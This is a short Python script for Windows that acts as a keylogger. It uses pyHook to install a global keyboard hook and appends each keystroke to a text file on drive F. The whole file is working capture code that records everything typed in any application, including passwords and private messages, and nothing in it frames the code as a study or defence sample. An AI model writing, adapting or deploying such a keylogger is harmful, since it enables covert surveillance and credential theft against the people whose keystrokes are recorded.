import pythoncom, pyHook, sys, logging, os

file_log = 'F:\s.txt'
def onKeyboardEvent(event):
	logging.basicConfig(filename=file_log, level=logging.DEBUG, format='%(message)s')
	c = chr(event.Ascii)
	logging.log(10, c)
	return True
	
hooks_manager = pyHook.HookManager()
hooks_manager.KeyDown = onKeyboardEvent
hooks_manager.HookKeyboard()
pythoncom.PumpMessages()
